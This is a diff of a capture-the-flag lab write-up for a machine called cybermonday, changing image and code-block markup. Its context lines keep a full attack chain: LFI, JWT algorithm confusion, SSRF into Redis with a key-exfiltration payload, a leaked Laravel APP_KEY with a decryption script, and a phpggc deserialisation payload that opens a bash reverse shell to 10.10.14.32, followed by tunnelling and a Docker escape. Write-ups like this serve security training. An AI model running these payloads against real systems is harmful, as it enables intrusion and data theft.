@@ -35,25 +35,25 @@ We can add this host to our `/etc/hosts` file.
 
 The website shows a shop:
 
-<figure><img src="../../.gitbook/assets/image (4184).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4184).png>)
 
 There are a few products available:
 
-<figure><img src="../../.gitbook/assets/image (4185).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4185).png>)
 
 When the traffic is proxied, we can see that there are some JWT tokens being passed around:
 
-<figure><img src="../../.gitbook/assets/image (4186).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4186).png>)
 
 I tried creating a user and logging in.
 
-<figure><img src="../../.gitbook/assets/image (4187).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4187).png>)
 
 The site is powered by PHP based on the `X-Powered-By` header. Since there was nothing much here, I did a `feroxbuster` scan to view the hidden directories. This revealed the `assets` directories with loads of stuff, but I couldn't really use all of it.
 
 Since this was an `nginx` server, I checked Hacktricks and tested a few things, such as the `nginx` LFI exploit:
 
-<figure><img src="../../.gitbook/assets/image (4188).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4188).png>)
 
 This caused a `403` to be returned, indicating that it might work. `gobuster` confirms this:
 
@@ -266,35 +266,35 @@ It seems that there's an `isAdmin` boolean variable being set. We can change thi
 
 I appended `isAdmin=1` to the end of the POST parameters and updated my user's profile, which worked since the Dashboard appeared!
 
-<figure><img src="../../.gitbook/assets/image (4189).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4189).png>)
 
 ### Admin Dashboard -> Webhook Subdomain
 
 The changelog of the administrator's dashboard was the most interesting:
 
-<figure><img src="../../.gitbook/assets/image (4190).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4190).png>)
 
 The link redirected us to `webhooks-api-beta.cybermonday.htb`, which we can add to the `hosts` file. Visiting that site revealed some kind of API:
 
-<figure><img src="../../.gitbook/assets/image (4191).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4191).png>)
 
 Webhooks open up the possibilities of SSRF, and from the earlier `.env` file, we know that this machine uses Redis on port 6379, which we might need to interact with to get a password or something. The `sendRequest` action seems to be vulnerable to SSRF somehow.
 
 To use this API, we first need to create a user.
 
-<figure><img src="../../.gitbook/assets/image (4192).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4192).png>)
 
 Afterwards, logging in would return an `x-access-token` for us to use:
 
-<figure><img src="../../.gitbook/assets/image (4193).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4193).png>)
 
 However, we are not authorized to create webhooks on this site with this token:
 
-<figure><img src="../../.gitbook/assets/image (4194).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4194).png>)
 
 It's worth noting that the JWT token stored contains our user ID and our username:
 
-<figure><img src="../../.gitbook/assets/image (4195).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4195).png>)
 
 There should be a way to spoof this token or get the secret required.
 
@@ -388,15 +388,15 @@ With this PEM, we can spoof tokens by changing the algorithm to HS256 instead of
 
 I used Burpsuite extensions (JOSEPH and JWT Editor Keys) to attack this. First, we can edit the JWT to have this as the payload and header:
 
-<figure><img src="../../.gitbook/assets/image (4196).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4196).png>)
 
 Afterwards, we can sign the token using the PEM string we got earlier using JOSEPH. Since JWTs are 3 separate fields separated by `.` characters, I just removed the signature part of the token from JWT Editor Keys:
 
-<figure><img src="../../.gitbook/assets/image (4197).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4197).png>)
 
 Using this token, we can then access the `/webhooks` endpoint:
 
-<figure><img src="../../.gitbook/assets/image (4198).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4198).png>)
 
 ### Redis SSRF -> Deserialisation RCE
 
@@ -404,7 +404,7 @@ Using this token, we can then access the `/webhooks` endpoint:
 
 Now that we can create our own webhooks, we create a webhook with the `action` parameter set to `sendRequest`:
 
-<figure><img src="../../.gitbook/assets/image (4199).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4199).png>)
 
 Using this, we can then send requests from the server:
 
@@ -426,17 +426,17 @@ Content-Length: 51
 {"url":"http://10.10.14.32/iamssrf","method":"GET"}
 ```
 
-<figure><img src="../../.gitbook/assets/image (4200).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4200).png>)
 
 Attempts to use any other protocol fails:
 
-<figure><img src="../../.gitbook/assets/image (4201).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4201).png>)
 
 Very early on, we saw that we had a Redis server operating on the server when we read the `.env` file through the `nginx` LFI exploit. I know that its possible to interact with Redis through HTTP requests, and the SSRF for this machine returns the message retrieved from its request.
 
 From the `.env` file, the `REDIS_HOST` variable is set to `redis`, indicating that we have to use that. On the Hacktricks page for Redis, there's an interesting part that talks about `slaveof`.
 
-<figure><img src="../../.gitbook/assets/image (4202).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4202).png>)
 
 I used this JSON object:
 
@@ -446,7 +446,7 @@ I used this JSON object:
 
 When I opened a listener port, this is what I got:
 
-<figure><img src="../../.gitbook/assets/image (4203).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4203).png>)
 
 Hacktricks mentions that we might be able to control the master instance (the machine) with our slave. This means that we could potentially read stuff within the machine. To exploit this, we can first create a `redis-server` to accept incoming connections and retrieve output from the commands I sent via webhooks.
 
@@ -508,15 +508,13 @@ With this, we now need a way to export all the keys from the remote Redis server
 
 This was the payload I used:
 
-{% code overflow="wrap" %}
 ```json
 {"url":"http://redis:6379/","method":"EVAL 'for k,v in pairs(redis.call(\"KEYS\", \"*\")) do redis.pcall(\"MIGRATE\",\"10.10.14.32\",\"6379\",v,0,200) end' 0\r\n*1\r\n$20\r\n"}
 ```
-{% endcode %}
 
 The last parts are for handling the arguments passed to Redis:
 
-<figure><img src="../../.gitbook/assets/image (4204).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4204).png>)
 
 Afterwards, we need to replicate the remote Redis database to our own. This would allow us to write to the remote Redis database if we need to:
 
@@ -532,7 +530,6 @@ We might obtain a read only replica error, which can be fixed with this:
 
 After all of this, we can use `redis-cli` to view the keys present:
 
-{% code overflow="wrap" %}
 ```
 $ redis-cli -h 127.0.0.1 -p 6379
 127.0.0.1:6379> keys *
@@ -540,13 +537,11 @@ $ redis-cli -h 127.0.0.1 -p 6379
 127.0.0.1:6379> get laravel_session:uVlrclU6uti6bHeLM5qBhACuOsqEL0f1GASURNgH
 "s:247:\"a:4:{s:6:\"_token\";s:40:\"oAXl7Y1nw3REQ4KyL8GypmaxAUjJP5tkfA3N4n73\";s:9:\"_previous\";a:1:{s:3:\"url\";s:27:\"http://cybermonday.htb/home\";}s:6:\"_flash\";a:2:{s:3:\"old\";a:0:{}s:3:\"new\";a:0:{}}s:50:\"login_web_59ba36addc2b2f9401580f014c7f58ea4e30989d\";i:2;}\";"
 ```
-{% endcode %}
 
 Since we have the `APP_KEY` variable retrieved earlier from the `.env` file, we can decode this cookie and potentially change it to have a reverse shell payload (if its being deserialised).
 
 We can decrypt the `cybermonday_session` JWT token using this script from Hacktricks:
 
-{% code overflow="wrap" %}
 ```python
 import os
 import json
@@ -603,14 +598,11 @@ app_key ='EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA='
 key = base64.b64decode(app_key)
 print(decrypt('eyJpdiI6InFReUpScXptMG4xcnRzT0hWKzF1d0E9PSIsInZhbHVlIjoiZ3l1NjgvTGVhZnRIK05RRnNOM3N2ZWVLOTFkekhrSDNOTnl1SFdPNTQvcmhlbUhQN1FyMFBHT29ncEVlTWlFeG00WFN2WlI2cU1MU1RkNXBpZm1rL3lPK21RUTZRZlBNM2hjYzRKN01jNzFNb3pLNldZdGNMcTYrTEFtMlFXYnQiLCJtYWMiOiI0NWU5YzFlNTQyZTIxYWE1NjFiODE0ODM3YWZkMGY3YTg5MGQwNzQyZWU0MDU0MjRhNzUzYzVjYmIxMmEyMzJiIiwidGFnIjoiIn0='))
 ```
-{% endcode %}
 
-{% code overflow="wrap" %}
 ```
 $ python3 dec.py
 b'25c6a7ecd50b519b7758877cdc95726f29500d4c|uVlrclU6uti6bHeLM5qBhACuOsqEL0f1GASURNgH\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f'
 ```
-{% endcode %}
 
 This gives the `laravel_session` cookie ID. Using this, we can attempt to set this to a PHP serialised object to get RCE since the `cybermonday_session` uses this value since we can manipulate the cookie value.
 
@@ -618,24 +610,20 @@ This gives the `laravel_session` cookie ID. Using this, we can attempt to set th
 
 After some testing, I found that `Laravel/RCE16` is the correct gadget chain to use:
 
-{% code overflow="wrap" %}
 ```
 $ ./phpggc -f -a Laravel/RCE16 system 'bash -c "bash -i >& /dev/tcp/10.10.14.32/443 0>&1 2<&1"'
 a:2:{i:7;O:35:"Monolog\Handler\RotatingFileHandler":4:{S:13:"\00*\00mustRotate";b:1;S:11:"\00*\00filename";S:8:"anything";S:17:"\00*\00filenameFormat";O:38:"Illuminate\Validation\Rules\RequiredIf":1:{S:9:"condition";a:2:{i:0;O:28:"Illuminate\Auth\RequestGuard":3:{S:11:"\00*\00callback";S:14:"call_user_func";S:10:"\00*\00request";S:6:"system";S:11:"\00*\00provider";S:55:"bash -c "bash -i >& /dev/tcp/10.10.14.32/443 0>&1 2<&1"";}i:1;S:4:"user";}}S:13:"\00*\00dateFormat";S:1:"l";}i:7;i:7;}
 ```
-{% endcode %}
 
 Afterwards, I set the value of the cookie to my payload:
 
-{% code overflow="wrap" %}
 ```
 127.0.0.1:6379> set 'laravel_session:uVlrclU6uti6bHeLM5qBhACuOsqEL0f1GASURNgH' 'a:2:{i:7;O:35:"Monolog\Handler\RotatingFileHandler":4:{S:13:"\00*\00mustRotate";b:1;S:11:"\00*\00filename";S:8:"anything";S:17:"\00*\00filenameFormat";O:38:"Illuminate\Validation\Rules\RequiredIf":1:{S:9:"condition";a:2:{i:0;O:28:"Illuminate\Auth\RequestGuard":3:{S:11:"\00*\00callback";S:14:"call_user_func";S:10:"\00*\00request";S:6:"system";S:11:"\00*\00provider";S:55:"bash -c "bash -i >& /dev/tcp/10.10.14.32/443 0>&1 2<&1"";}i:1;S:4:"user";}}S:13:"\00*\00dateFormat";S:1:"l";}i:7;i:7;}'
 ```
-{% endcode %}
 
 Upon refreshing the page, I got a shell as `www-data`:
 
-<figure><img src="../../.gitbook/assets/image (4205).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4205).png>)
 
 ## Privilege Escalation 1
 
@@ -714,7 +702,6 @@ OLDPWD=/dev
 
 One of the things that stood out was the `changelog.txt` within `/mnt`, and within it I found the user flag:
 
-{% code overflow="wrap" %}
 ```
 www-data@070370e2cdc4:/mnt$ ls -la
 total 40
@@ -733,11 +720,9 @@ drwxrwxrwx 2 root root 4096 Aug  3 09:51 logs
 www-data@070370e2cdc4:/mnt/.ssh$ cat authorized_keys 
 ssh-rsa <TRUNCATED> john@cybermonday
 ```
-{% endcode %}
 
 I couldn't read the user flag, but at least I got `john` as the user. There was also mention of the MySQL database, along with the username and password being `root:root`. I port forwarded this to my machine using `chisel`:
 
-{% code overflow="wrap" %}
 ```bash
 # on attacker
 ./chisel server -p 4444 --reverse
@@ -745,7 +730,6 @@ I couldn't read the user flag, but at least I got `john` as the user. There was 
 # on machine
 ./chisel client 10.10.14.32:4444 R:3306:db:3306 (DB_HOST = db from .env)
 ```
-{% endcode %}
 
 ```
 $ mysql -h 127.0.0.1 -u root -p     
@@ -1025,15 +1009,15 @@ Now, we just need to bypass the string checks within the code using this:
 {"action":"read","log_name":"logs/. ./etc/passwd"}
 ```
 
-<figure><img src="../../.gitbook/assets/image (4206).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4206).png>)
 
 LFI works! We don't have many files to read, so I started by reading the files within `/proc` to find stuff. Within the `/proc/self/environ` file, we can find a new password:
 
-<figure><img src="../../.gitbook/assets/image (4207).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4207).png>)
 
 With this password, we can finally `ssh` in as the user and read the user flag:
 
-<figure><img src="../../.gitbook/assets/image (4210).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4210).png>)
 
 ## Privilege Esclation 2
 
@@ -1197,7 +1181,7 @@ services:
 
 Using the above file would give us a reverse shell in the Docker container we create:
 
-<figure><img src="../../.gitbook/assets/image (4209).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4209).png>)
 
 Afterwards, we can `mount` back onto the main machine since we have all capabilities. However, this does not work for some reason:
 
@@ -1252,6 +1236,6 @@ chmod 600 .ssh
 
 We can then `ssh` in as `root`:
 
-<figure><img src="../../.gitbook/assets/image (4211).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4211).png>)
 
 Rooted!
